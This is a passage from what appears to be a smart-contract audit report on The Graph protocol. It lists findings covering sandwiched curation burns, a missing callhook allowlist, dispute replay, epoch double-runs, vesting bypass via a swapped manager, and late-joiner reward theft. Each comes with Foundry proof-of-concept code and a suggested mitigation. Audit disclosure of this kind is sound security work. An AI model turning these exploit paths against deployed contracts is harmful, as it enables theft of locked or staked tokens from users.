1. A subgraph has a large curation position represented by `subgraphData.vSignal` and `subgraphData.nSignal`. 2. The owner submits `sendSubgraphToL2`, `deprecateSubgraph`, or `publishNewVersion`. 3. A permissionless curation trader observes the transaction and front-runs with a large burn/sell on the same subgraph deployment, depressing the bonding curve execution price. 4. The owner transaction executes and calls `curation.burn(..., 0)`, so it cannot revert on the depressed output. 5. L1GNS splits or rolls over the reduced token amount, permanently lowering curator/owner value. 6. The attacker back-runs to restore their curation position at the new price and captures the value difference.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    uint256 public burnReturn;
    function setBurnReturn(uint256 v) external { burnReturn = v; }
    function burn(bytes32, uint256, uint256 minOut) external view returns (uint256) {
        require(burnReturn >= minOut, "SLIPPAGE");
        return burnReturn;
    }
}

contract L1GNSHarness {
    struct SubgraphData {
        bool disabled;
        bytes32 deployment;
        uint256 vSignal;
        uint256 nSignal;
        uint256 withdrawableGRT;
        mapping(address => uint256) curatorNSignal;
    }
    MockCuration public curation;
    mapping(uint256 => SubgraphData) internal subgraphs;
    constructor(MockCuration c) { curation = c; }
    function seed(uint256 id, address owner, address other, uint256 ownerN, uint256 otherN, uint256 vSignal) external {
        SubgraphData storage s = subgraphs[id];
        s.deployment = bytes32(uint256(1));
        s.vSignal = vSignal;
        s.nSignal = ownerN + otherN;
        s.curatorNSignal[owner] = ownerN;
        s.curatorNSignal[other] = otherN;
    }
    function vulnerableSendSubgraphToL2(uint256 id) external returns (uint256 tokensForL2, uint256 withdrawableGRT) {
        SubgraphData storage s = subgraphs[id];
        uint256 curationTokens = curation.burn(s.deployment, s.vSignal, 0);
        s.disabled = true;
        s.vSignal = 0;
        uint256 ownerNSignal = s.curatorNSignal[msg.sender];
        uint256 totalSignal = s.nSignal;
        tokensForL2 = ownerNSignal * curationTokens / totalSignal;
        s.curatorNSignal[msg.sender] = 0;
        s.nSignal = totalSignal - ownerNSignal;
        s.withdrawableGRT = curationTokens - tokensForL2;
        withdrawableGRT = s.withdrawableGRT;
    }
}

contract L1GNSSlippagePoC is Test {
    function testZeroMinOutAcceptsSandwichedCurationBurn() external {
        address owner = address(0xA11CE);
        address otherCurator = address(0xB0B);
        MockCuration curation = new MockCuration();
        L1GNSHarness gns = new L1GNSHarness(curation);
        gns.seed(1, owner, otherCurator, 50 ether, 50 ether, 100 ether);

        uint256 quotedBurnValue = 1_000_000 ether;
        uint256 expectedOwnerShare = quotedBurnValue / 2;

        curation.setBurnReturn(100_000 ether);
        vm.prank(owner);
        (uint256 ownerReceived, uint256 remainingWithdrawable) = gns.vulnerableSendSubgraphToL2(1);

        assertEq(ownerReceived, 50_000 ether);
        assertEq(remainingWithdrawable, 50_000 ether);
        assertGt(expectedOwnerShare, ownerReceived * 5);
    }
}

## Suggested Mitigation
Add caller-supplied minimums and deadlines to owner lifecycle functions and pass them into Curation. For example, `sendSubgraphToL2` should require `_minCurationTokensOut` and optionally `_minTokensForL2`, `deprecateSubgraph` should require `_minWithdrawableGRT`, and `publishNewVersion` should require both `_minTokensFromOldDeployment` and `_minVSignalOnNewDeployment`. Revert if the executed burn/mint outputs fall below these bounds.


## [H-7]. Missing L1 sender allowlist lets any bridged deposit trigger L2GraphTokenGateway callhooks

## id: o8vp1anUo3H8qXm2HGs6x

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: missing allowlist guard for hook-enabled bridge deposits

## Exploit Type
AuthByPass

## Location
L2GraphTokenGateway.finalizeInboundTransfer

## Finding Status: Valid
### Finding Status Justification: The claimed code path exists in the in-scope L2GraphTokenGateway.finalizeInboundTransfer. The function authenticates only msg.sender as the aliased l1Counterpart, checks _l1Token, msg.value, pause state, and reentrancy, then mints L2 GRT to _to. If _data.length > 0 it unconditionally calls ICallhookReceiver(_to).onTokenTransfer(_from, _amount, _data). The function comment states allowlisted senders can include additional calldata for callhooks, but no allowlist variable, mapping, or require on _from is present in the provided implementation. onlyL1Counterpart only proves the bridge message came through the L1 gateway; it does not prove _from is an approved protocol sender for hook-enabled deposits. Therefore there is no complete safeguard against an unallowlisted L1 depositor causing a gateway-authenticated hook call on an L2 recipient during a valid bridged deposit. The behavior is not explicitly documented as an accepted risk; the comments indicate the opposite intended restriction. The exploit path is currently reachable through normal L1-to-L2 deposit finalization if a user can supply nonempty data. It does not require privileged-role abuse or victim misuse, though concrete downstream impact depends on recipient contracts that trust the gateway hook.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
finalizeInboundTransfer documents that only allowlisted L1 senders should be able to include calldata that executes an L2 callhook, but the implementation executes the hook for any nonempty _data after only authenticating the aliased L1 gateway, token address, pause state, and msg.value. Vulnerable snippet: L2GraphToken(calculateL2TokenAddress(l1GRT)).bridgeMint(_to, _amount); if (_data.length > 0) { ICallhookReceiver(_to).onTokenTransfer(_from, _amount, _data); }. There is no allowlist check for _from or any hook authorization state before calling the recipient. A permissionless L1 depositor can therefore route a deposit with attacker-controlled _data to any L2 contract implementing onTokenTransfer and force that contract to receive a call from the trusted gateway, bypassing the intended restriction that hook-enabled deposits are limited to approved protocol senders.

## Impact
Unauthorized gateway-authenticated hook execution against L2 recipient contracts. If recipient contracts trust L2GraphTokenGateway hook calls for protocol actions, an unallowlisted sender can trigger unwanted actions or attacker-controlled state transitions that were intended to be available only to approved L1 protocol contracts.

## Proof of Concept
1. The gateway is configured and unpaused, and L1Counterpart can deliver retryable deposits to finalizeInboundTransfer. 2. A permissionless L1 attacker initiates a GRT deposit to a hook-enabled L2 contract and includes nonempty attacker-controlled calldata. 3. The aliased L1 counterpart calls finalizeInboundTransfer on L2 with _from equal to the attacker and _data nonempty. 4. L2GraphTokenGateway mints tokens to _to and unconditionally calls ICallhookReceiver(_to).onTokenTransfer(_from, _amount, _data). 5. The recipient observes msg.sender as the trusted gateway and executes the hook even though _from was never allowlisted for hook-enabled deposits.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

library AddressAliasHelperPoC {
    uint160 internal constant offset = uint160(0x1111000000000000000000000000000000001111);

    function applyL1ToL2Alias(address l1Address) internal pure returns (address) {
        return address(uint160(l1Address) + offset);
    }
}

interface ICallhookReceiverPoC {
    function onTokenTransfer(address from, uint256 amount, bytes calldata data) external;
}

contract MockL2GraphTokenPoC {
    mapping(address => uint256) public balanceOf;

    function bridgeMint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract L2GraphTokenGatewayHarnessPoC {
    address public l1GRT;
    address public l1Counterpart;
    MockL2GraphTokenPoC public token;

    constructor(address l1GRT_, address l1Counterpart_, MockL2GraphTokenPoC token_) {
        l1GRT = l1GRT_;
        l1Counterpart = l1Counterpart_;
        token = token_;
    }

    modifier onlyL1Counterpart() {
        require(msg.sender == AddressAliasHelperPoC.applyL1ToL2Alias(l1Counterpart), "ONLY_COUNTERPART_GATEWAY");
        _;
    }

    function finalizeInboundTransfer(
        address _l1Token,
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _data
    ) external payable onlyL1Counterpart {
        require(_l1Token == l1GRT, "TOKEN_NOT_GRT");
        require(msg.value == 0, "INVALID_NONZERO_VALUE");

        token.bridgeMint(_to, _amount);

        if (_data.length > 0) {
            ICallhookReceiverPoC(_to).onTokenTransfer(_from, _amount, _data);
        }
    }
}

contract HookReceiverPoC is ICallhookReceiverPoC {
    bool public called;
    address public observedSender;
    address public observedFrom;
    uint256 public observedAmount;
    bytes public observedData;

    function onTokenTransfer(address from, uint256 amount, bytes calldata data) external {
        called = true;
        observedSender = msg.sender;
        observedFrom = from;
        observedAmount = amount;
        observedData = data;
    }
}

contract L2GraphTokenGatewayHookBypassTest is Test {
    function testNonAllowlistedL1SenderCanTriggerCallhook() public {
        address l1GRT = address(0x1111);
        address l1Counterpart = address(0x2222);
        address nonAllowlistedL1Sender = address(0xBEEF);
        MockL2GraphTokenPoC token = new MockL2GraphTokenPoC();
        L2GraphTokenGatewayHarnessPoC gateway = new L2GraphTokenGatewayHarnessPoC(l1GRT, l1Counterpart, token);
        HookReceiverPoC receiver = new HookReceiverPoC();

        address aliasedCounterpart = AddressAliasHelperPoC.applyL1ToL2Alias(l1Counterpart);
        bytes memory attackerData = abi.encode("attacker-controlled hook payload");

        vm.prank(aliasedCounterpart);
        gateway.finalizeInboundTransfer(l1GRT, nonAllowlistedL1Sender, address(receiver), 1 ether, attackerData);

        assertEq(token.balanceOf(address(receiver)), 1 ether);
        assertEq(receiver.called(), true);
        assertEq(receiver.observedSender(), address(gateway));
        assertEq(receiver.observedFrom(), nonAllowlistedL1Sender);
        assertEq(receiver.observedAmount(), 1 ether);
        assertGt(receiver.observedData().length, 0);
    }
}


## Suggested Mitigation
Add explicit hook authorization before executing onTokenTransfer. For example, maintain a governor-managed mapping of L1 senders allowed to use callhooks and require hookSenders[_from] when _data.length > 0; otherwise revert. Alternatively, move the allowlist check to the authenticated L1 counterpart and pass only sanitized hook data, but the L2 gateway should still defensively enforce the invariant before making the external call.


## [M-8]. Live stake read lets disputed indexer reduce slashable stake before dispute acceptance

## id: Ec3H-wdfN6sIYqX0DfzoU

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
DisputeManager.acceptDispute

## Finding Status: Valid
### Finding Status Justification: Dispute creation checks only staking().getIndexerStakedTokens(indexer) > 0 and stores no stake or slash snapshot. acceptDispute later calls _slashIndexer, which rereads getIndexerStakedTokens(_indexer), calculates a percentage of that live value, and reverts if the computed slash is zero. The provided code contains no lock, snapshot, pending-dispute freeze, or minimum slash stored at creation. The finding is in scoped production code. Current exploitability depends on the staking system allowing stake reduction between creation and acceptance, which is a realistic present-day protocol operation and is not shown to be impossible or fully guarded.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Dispute creation only checks that the indexer has positive stake, but the slash amount is calculated later from the indexer's live stake at acceptance. Vulnerable snippets: `require(staking().getIndexerStakedTokens(indexer) > 0, "Dispute indexer has no stake");` during creation and later `uint256 slashableAmount = staking.getIndexerStakedTokens(_indexer); slashAmount = _getSlashingPercentageForDisputeType(_disputeType).mul(slashableAmount).div(MAX_PPM); require(slashAmount > 0, "Dispute has zero tokens to slash");`. If staking state can be reduced between those transactions, an indexer can lower the penalty and can make `slashAmount` round to zero, causing acceptance to revert.

## Impact
A valid dispute can become impossible to accept or can slash materially less than the stake that made the dispute valid at creation. The fisherman loses the expected reward path and the disputed indexer can avoid the intended economic penalty.

## Proof of Concept
1. Indexer has stake and a valid allocation, so a fisherman creates a dispute. 2. Before the arbitrator accepts, the indexer or authorized stake operator reduces the indexer's stake. 3. The arbitrator calls `acceptDispute()`. 4. `_slashIndexer()` reads the reduced live stake and either computes a much smaller slash or zero. 5. If zero, the accept transaction reverts and the dispute must be drawn or rejected instead of accepted.

## Proof of Code
// Foundry PoC sketch: mock staking exposes setStake(indexer, amount). Create a dispute while stake is 1_000_000e18, then setStake(indexer, 1) before acceptDispute. Prank arbitrator and expectRevert("Dispute has zero tokens to slash") when acceptDispute is called with a slashing percentage below 100%. Assert the dispute remains Pending after the revert.

## Suggested Mitigation
Snapshot `slashableAmount` or the computed `slashAmount` at dispute creation and use the snapshot during acceptance, or make staking lock the disputed indexer's slashable stake while a dispute is pending.


## [H-9]. Query attestations can be replayed by new fishermen to repeatedly slash the same indexer

## id: pE0GLsNwqCEwLvMTg5u0D

## Derived From Pattern/Invariant
PermitOrSignatureReplay / DoubleExecutionOrReplay

## Exploit Type
SignatureReplay

## Location
DisputeManager.createQueryDispute, createQueryDisputeConflict, _createQueryDisputeWithAttestation

## Finding Status: Valid
### Finding Status Justification: The code confirms the duplicate guard is submitter-scoped. _createQueryDisputeWithAttestation hashes requestCID, responseCID, subgraphDeploymentID, indexer, and _fisherman, then only checks that disputeID. The same attestation submitted by another fisherman produces a different key. acceptDispute later slashes per dispute and has no consumed evidence mapping. QueryDisputeCreated also emits the attestation bytes, making copied evidence plausible. Conflict disputes are zero deposit. Normal arbitrator acceptance is part of the protocol workflow and is not a requirement for privileged compromise or abuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
DisputeManager's duplicate guard keys query disputes by the caller-controlled fisherman address, not by a globally consumed attestation/evidence hash. The same signed receipt submitted by two different fisherman addresses therefore produces two different dispute IDs and can be accepted independently. Vulnerable snippet: `bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman)); require(!isDisputeCreated(disputeID), ...);` Later, each pending dispute accepted by the arbitrator calls `_slashIndexer(dispute.indexer, dispute.fisherman, dispute.disputeType)`. For `createQueryDisputeConflict()`, the replay is even cheaper because both disputes are created with deposit `0`. A searcher can copy attestation bytes from calldata or `QueryDisputeCreated` logs and resubmit the same evidence through fresh fisherman addresses, creating multiple pending disputes for one underlying signed receipt/conflict pair.

## Impact
A single invalid query attestation or conflict pair can drive repeated slashing and repeated fisherman rewards instead of one slash for one piece of evidence. For a large staked indexer, replayed accepted disputes can transfer significant GRT rewards from staked funds to replaying fishermen and over-penalize the indexer.

## Proof of Concept
1. An allocation key signs one disputable query attestation, or two conflicting attestations for the zero-deposit conflict path. 2. Fisherman A submits the attestation and creates dispute ID A. 3. Fisherman B copies the same attestation bytes from calldata or logs and submits the same evidence from a different address. Because `_fisherman` is part of the hash, dispute ID B is distinct and passes `!isDisputeCreated`. 4. The arbitrator accepts both pending disputes as valid evidence. 5. `_slashIndexer` is executed once per dispute, paying rewards to both fishermen for the same underlying signed evidence.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract ReplayHarness {
    uint256 constant MAX_PPM = 1_000_000;
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; address fisherman; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    mapping(address => uint256) public stake;
    mapping(address => uint256) public reward;
    uint256 public slashPpm = 100_000;
    uint256 public rewardPpm = 500_000;

    function setStake(address indexer, uint256 amount) external { stake[indexer] = amount; }

    function createDispute(bytes32 req, bytes32 resp, bytes32 subgraph, address indexer, address fisherman) external returns (bytes32 id) {
        id = keccak256(abi.encodePacked(req, resp, subgraph, indexer, fisherman));
        require(disputes[id].status == Status.Null, "exists");
        disputes[id] = Dispute(indexer, fisherman, Status.Pending);
    }

    function accept(bytes32 id) external {
        Dispute storage d = disputes[id];
        require(d.status == Status.Pending, "pending");
        d.status = Status.Accepted;
        uint256 slash = stake[d.indexer] * slashPpm / MAX_PPM;
        require(slash > 0, "zero");
        uint256 rew = slash * rewardPpm / MAX_PPM;
        stake[d.indexer] -= slash;
        reward[d.fisherman] += rew;
    }
}

contract DisputeManagerReplayPoC is Test {
    function testSameAttestationCanBeReplayedByDifferentFishermenAndSlashTwice() public {
        ReplayHarness h = new ReplayHarness();
        address indexer = address(0x100);
        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        h.setStake(indexer, 1000 ether);

        bytes32 req = keccak256(bytes("req"));
        bytes32 resp = keccak256(bytes("resp"));
        bytes32 subgraph = keccak256(bytes("subgraph"));

        bytes32 d1 = h.createDispute(req, resp, subgraph, indexer, alice);
        bytes32 d2 = h.createDispute(req, resp, subgraph, indexer, bob);
        assertTrue(d1 != d2);

        h.accept(d1);
        uint256 afterFirst = h.stake(indexer);
        h.accept(d2);

        assertLt(h.stake(indexer), afterFirst);
        assertGt(h.reward(alice), 0);
        assertGt(h.reward(bob), 0);
        assertEq(h.stake(indexer), 810 ether);
    }
}

## Suggested Mitigation
Make query evidence globally idempotent. Compute and store an evidence key that excludes `_fisherman`, for example `keccak256(abi.encode(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer))`, and reject any later dispute for an already pending or resolved evidence key. For conflict disputes, canonicalize the two attestation hashes and consume the pair once. If multiple reporters should be supported, slash once and handle reward sharing explicitly rather than creating independent slashable disputes.


## [M-10]. EpochManager.setEpochLength can retroactively advance epochs and allow runEpoch twice in one original epoch interval

## id: tsLs6ez0cONVmhrdc7NwK

## Derived From Pattern/Invariant
DoubleExecutionOrReplay

## Exploit Type
ReplayAttack

## Location
EpochManager.setEpochLength

## Finding Status: Valid
### Finding Status Justification: The state-machine flaw is present in the supplied code, but exploitation requires a valid governor parameter update and the provided EpochManager has no monetary hook body, so severity is limited to a governance-triggered functional duplicate-execution risk.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
setEpochLength() snapshots lastLengthUpdateBlock to currentEpochBlock(), the start block of the old epoch, then immediately applies the new epochLength to blocks that already elapsed under the old schedule. If governance shortens the epoch mid-epoch, currentEpoch() can jump forward in the same block. Since runEpoch() only guards against lastRunEpoch == currentEpoch(), a previous run for the old current epoch no longer counts and any caller can runEpoch() again before a real epoch boundary.

Vulnerable snippet:
function setEpochLength(uint256 _epochLength) external override onlyGovernor {
    require(_epochLength > 0, "Epoch length cannot be 0");
    require(_epochLength != epochLength, "Epoch length must be different to current");

    lastLengthUpdateEpoch = currentEpoch();
    lastLengthUpdateBlock = currentEpochBlock();
    epochLength = _epochLength;

    emit EpochLengthUpdate(lastLengthUpdateEpoch, epochLength);
}

At block 90 with epochLength = 100, currentEpoch() is 1. After runEpoch(), lastRunEpoch is 1. If governance calls setEpochLength(10), lastLengthUpdateEpoch remains 1 and lastLengthUpdateBlock remains the old epoch start, so currentEpoch() becomes 10 in the same block and isCurrentEpochRun() becomes false.

## Impact
Duplicate epoch execution can trigger downstream epoch-dependent accounting, maintenance, rewards, or dispute hooks more than once for the same elapsed epoch interval. In the provided EpochManager code the direct effect is duplicate EpochRun state/events, so the issue is governance-triggered and functional unless integrated hooks attach monetary effects.

## Proof of Concept
1. Initialize EpochManager at block 0 with epochLength = 100.
2. Advance to block 90; currentEpoch() is still 1.
3. Any caller calls runEpoch(); lastRunEpoch becomes 1 and isCurrentEpochRun() returns true.
4. Governor performs a valid parameter update setEpochLength(10).
5. currentEpoch() immediately becomes 10 even though no real epoch boundary under the old schedule was crossed.
6. isCurrentEpochRun() returns false, allowing any caller to call runEpoch() again in the same original epoch interval.

## Proof of Code
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

contract EpochManagerLike {
    uint256 public epochLength;
    uint256 public lastRunEpoch;
    uint256 public lastLengthUpdateEpoch;
    uint256 public lastLengthUpdateBlock;
    address public governor;

    event EpochRun(uint256 indexed epoch, address caller);
    event EpochLengthUpdate(uint256 indexed epoch, uint256 epochLength);

    constructor(uint256 _epochLength) {
        require(_epochLength > 0, "Epoch length cannot be 0");
        governor = msg.sender;
        lastLengthUpdateEpoch = 1;
        lastLengthUpdateBlock = block.number;
        epochLength = _epochLength;
        emit EpochLengthUpdate(lastLengthUpdateEpoch, epochLength);
    }

    function setEpochLength(uint256 _epochLength) external {
        require(msg.sender == governor, "only governor");
        require(_epochLength > 0, "Epoch length cannot be 0");
        require(_epochLength != epochLength, "Epoch length must be different to current");
        lastLengthUpdateEpoch = currentEpoch();
        lastLengthUpdateBlock = currentEpochBlock();
        epochLength = _epochLength;
        emit EpochLengthUpdate(lastLengthUpdateEpoch, epochLength);
    }

    function runEpoch() external {
        require(!isCurrentEpochRun(), "Current epoch already run");
        lastRunEpoch = currentEpoch();
        emit EpochRun(lastRunEpoch, msg.sender);
    }

    function isCurrentEpochRun() public view returns (bool) {
        return lastRunEpoch == currentEpoch();
    }

    function currentEpoch() public view returns (uint256) {
        return lastLengthUpdateEpoch + epochsSinceUpdate();
    }

    function currentEpochBlock() public view returns (uint256) {
        return lastLengthUpdateBlock + (epochsSinceUpdate() * epochLength);
    }

    function epochsSinceUpdate() public view returns (uint256) {
        return (block.number - lastLengthUpdateBlock) / epochLength;
    }
}

contract EpochManagerReplayPoC is Test {
    function test_setEpochLengthAllowsSecondRunInsideOldEpoch() public {
        vm.roll(0);
        EpochManagerLike manager = new EpochManagerLike(100);

        vm.roll(90);
        assertEq(manager.currentEpoch(), 1);

        address keeper = address(0xBEEF);
        vm.prank(keeper);
        manager.runEpoch();
        assertEq(manager.lastRunEpoch(), 1);
        assertEq(manager.isCurrentEpochRun(), true);

        manager.setEpochLength(10);
        assertEq(manager.currentEpoch(), 10);
        assertEq(manager.isCurrentEpochRun(), false);

        vm.prank(keeper);
        manager.runEpoch();
        assertEq(manager.lastRunEpoch(), 10);
        assertEq(manager.isCurrentEpochRun(), true);
    }
}

## Suggested Mitigation
Anchor epoch length changes at the actual governance transaction block rather than the old epoch start, or explicitly preserve the pre-update current epoch until a real post-update boundary. For example, set lastLengthUpdateEpoch = currentEpoch(), lastLengthUpdateBlock = blockNum(), and ensure currentEpochBlock() semantics are updated accordingly. Alternatively, add a separate lastRunBlock/lastRunInterval guard that prevents another runEpoch until block.number crosses the prior epoch boundary.


## [H-11]. Wallet owner can replace manager and let beneficiary bypass vesting through fallback token transfers

## id: O-td7UjPoXlyloTjZXbt2

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AuthByPass

## Location
L2GraphTokenLockWallet.setManager/fallback

## Finding Status: Valid
### Finding Status Justification: The inherited setManager(address) function lets the wallet owner select any contract manager. The fallback is callable by the beneficiary for non-revocable wallets and sends msg.data to manager.getAuthFunctionCallTarget(msg.sig). L2 initialization makes transferred wallets non-revocable, so a malicious manager can authorize the ERC20 token as the target for transfer(address,uint256), causing the wallet itself to transfer its GRT. The only shown checks are owner/beneficiary gating and nonzero target; none ensure the manager is canonical or prevent token transfer selectors. The exact risk is not explicitly documented as accepted.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
L2-transferred wallets are initialized as non-revocable and rely on the manager to restrict fallback calls to approved protocol functions. However, `GraphTokenLockWallet.setManager()` lets the wallet owner replace the manager with any contract. A malicious manager can return the GRT token address for the `transfer(address,uint256)` selector, after which the beneficiary calls the wallet fallback with ERC20 `transfer` calldata and drains locked tokens before `releaseStartTime`.

Vulnerable snippets:
`function setManager(address _newManager) external onlyOwner { _setManager(_newManager); }`

`address _target = manager.getAuthFunctionCallTarget(msg.sig); require(_target != address(0), "Unauthorized function"); Address.functionCall(_target, msg.data);`

## Impact
If the wallet owner and beneficiary are the same party, or collude, locked GRT can be released immediately despite the L2 wallet setting `releaseStartTime = endTime`. This defeats the lock schedule and can prematurely unlock large token-distribution balances.

## Proof of Concept
1. A transferred L2 wallet is created with attacker as owner and beneficiary, `managedAmount = 1,000,000 GRT`, and a future `endTime`.
2. Before vesting ends, `release()` returns zero because `releaseStartTime` is still in the future.
3. The attacker owner calls `setManager(evilManager)`.
4. `evilManager.getAuthFunctionCallTarget(IERC20.transfer.selector)` returns the GRT token address.
5. The attacker beneficiary calls the wallet fallback with `transfer(attacker, managedAmount)` calldata.
6. The wallet calls GRT as itself and transfers out the locked balance before maturity.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/L2GraphTokenLockManager.sol";
import "../contracts/L2GraphTokenLockWallet.sol";

contract MockGRT is ERC20 {
    constructor() ERC20("Graph Token", "GRT") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract EvilManager {
    address public token;
    constructor(address token_) { token = token_; }
    function getAuthFunctionCallTarget(bytes4 sig) external view returns (address) {
        if (sig == IERC20.transfer.selector) return token;
        return address(0);
    }
    function getTokenDestinations() external pure returns (address[] memory dst) { return dst; }
}

interface IWalletAdmin {
    function setManager(address newManager) external;
    function releasableAmount() external view returns (uint256);
}

contract L2WalletManagerBypassPoC is Test {
    MockGRT token;
    L2GraphTokenLockWallet impl;
    L2GraphTokenLockManager manager;
    address gateway = address(0xA11CE);
    address l1Tool = address(0xB0B);
    address l1Wallet = address(0xCAFE);
    address attacker = address(0xBAD);

    function setUp() public {
        token = new MockGRT();
        impl = new L2GraphTokenLockWallet();
        manager = new L2GraphTokenLockManager(IERC20(address(token)), address(impl), gateway, l1Tool);
    }

    function testOwnerCanSwapManagerAndBeneficiaryCanDrainBeforeEndTime() public {
        uint256 locked = 1_000_000 ether;
        L2GraphTokenLockManager.TransferredWalletData memory data = L2GraphTokenLockManager.TransferredWalletData({
            l1Address: l1Wallet,
            owner: attacker,
            beneficiary: attacker,
            managedAmount: locked,
            startTime: 1,
            endTime: 100 days
        });
        token.mint(address(manager), locked);
        vm.prank(gateway);
        manager.onTokenTransfer(l1Tool, locked, abi.encode(data));
        address wallet = manager.l1WalletToL2Wallet(l1Wallet);

        vm.warp(2);
        assertEq(IWalletAdmin(wallet).releasableAmount(), 0);

        EvilManager evil = new EvilManager(address(token));
        vm.prank(attacker);
        IWalletAdmin(wallet).setManager(address(evil));

        vm.prank(attacker);
        (bool ok,) = wallet.call(abi.encodeWithSelector(IERC20.transfer.selector, attacker, locked));
        assertTrue(ok);
        assertEq(token.balanceOf(attacker), locked);
        assertEq(token.balanceOf(wallet), 0);
    }
}

## Suggested Mitigation
Do not let individual wallet owners point token-lock wallets at arbitrary managers. Make the manager immutable for L2-transferred wallets, restrict manager changes to a trusted protocol governance path, or require new managers to be approved by the current canonical manager/governance. Also deny direct token `transfer`/`approve` selectors in fallback authorization unless the lock accounting is updated consistently.


## [M-12]. Late delegators can capture historical staking rewards by joining before reward distribution

## id: ebboW6ut29b_kdFrSR_SO

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
Staking / L1Staking.delegate / closeAllocation

## Finding Status: Valid
### Finding Status Justification: The finding is mechanically supported by the provided Staking and StakingExtension code. _delegate mints shares immediately from the current pool exchange rate and updates pool.tokens and pool.shares. When closeAllocation distributes indexing rewards, _distributeRewards calls _collectDelegationIndexingRewards, which adds delegationRewards to pool.tokens for all current shares. The code does not maintain time-weighted contribution, rewardDebt, per-allocation snapshots, or an activation delay for new shares. A permissionless late delegator can enter before closeAllocation and later redeem value including rewards from the prior accrual period. The issue is current, in scope, and not blocked by a complete safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are added to the shared delegation pool using only the balances present at distribution time, while new delegators receive shares immediately on deposit. The vulnerable accounting is: in _delegate(), shares = pool.tokens == 0 ? delegatedTokens : delegatedTokens * pool.shares / pool.tokens; then pool.tokens += delegatedTokens and pool.shares += shares. Later, _collectDelegationIndexingRewards() does pool.tokens = pool.tokens.add(delegationRewards) without tracking userRewardPerTokenPaid, rewardDebt, or a time-weighted contribution. A delegator can therefore deposit immediately before an allocation is closed and rewards are distributed, receiving a pro-rata claim on rewards accrued before they participated.

## Impact
Long-term delegators are diluted and a late joiner can extract part of historical indexing rewards from the delegation pool. The loss is proportional to the attacker's temporary delegation size and the pending reward amount for the allocation or epoch.

## Proof of Concept
1. Alice delegates 1000 GRT to an indexer and bears the full reward accrual period. 2. Before the indexer's allocation is closed with a valid POI, the attacker delegates 1000 GRT to the same indexer. 3. closeAllocation() calls _distributeRewards(), which adds historical delegationRewards to pool.tokens. 4. Because both Alice and the attacker now hold equal shares, the attacker receives half of the historical rewards despite not being delegated during accrual. 5. The attacker undelegates or migrates after capturing the reward uplift.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract RewardCheckpointFreeRiderPoC is Test {
    struct Pool { uint256 tokens; uint256 shares; mapping(address => uint256) sharesOf; }
    Pool internal pool;
    address internal alice = address(0xA11CE);
    address internal attacker = address(0xBEEF);

    function _delegate(address user, uint256 amount) internal {
        uint256 shares = pool.tokens == 0 ? amount : amount * pool.shares / pool.tokens;
        require(shares > 0, "!shares");
        pool.tokens += amount;
        pool.shares += shares;
        pool.sharesOf[user] += shares;
    }

    function _distributeDelegationRewards(uint256 rewards) internal {
        pool.tokens += rewards;
    }

    function _value(address user) internal view returns (uint256) {
        return pool.sharesOf[user] * pool.tokens / pool.shares;
    }

    function testLateJoinerCapturesHistoricalRewards() external {
        _delegate(alice, 1000 ether);
        assertEq(_value(alice), 1000 ether);

        _delegate(attacker, 1000 ether);
        _distributeDelegationRewards(1000 ether);

        assertEq(_value(alice), 1500 ether);
        assertEq(_value(attacker), 1500 ether);
        assertGt(_value(attacker) - 1000 ether, 0, "attacker captured historical rewards");
    }
}

## Suggested Mitigation
Track delegation rewards with a per-user reward index or rewardDebt. Update each delegator before minting or burning shares so new shares only accrue rewards distributed after the deposit. Alternatively, snapshot eligible delegation shares per allocation or epoch and distribute rewards only to that snapshot.


## [H-13]. Late curators can sandwich Curation.collect to steal pending query-fee reserves from existing signal holders

## id: dvukhFdlwmZfqc3LuaZ7m

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
Curation.mint, collect, burn

## Finding Status: Valid
### Finding Status Justification: The described code path exists in in-scope Curation.sol. mint() is permissionless, transfers GRT in, adds net tokens to pools[id].tokens, and mints GCS. collect() can then be called by the configured staking contract and only adds _tokens to the same pool reserve without minting signal, snapshotting pre-collection holders, or excluding recently minted GCS. burn() is permissionless for the holder, calculates tokensOut from current total GCS and inflated pool.tokens, then transfers GRT. There is slippage protection but no holding period, checkpoint, reward debt, or snapshot guard that fully blocks mint-before-collect-burn. The behavior is not explicitly documented as an accepted risk; generic curation-fee distribution comments do not accept same-block late-joiner extraction. Exploitability depends on an observable/ordered collect and available capital, not privileged abuse or victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
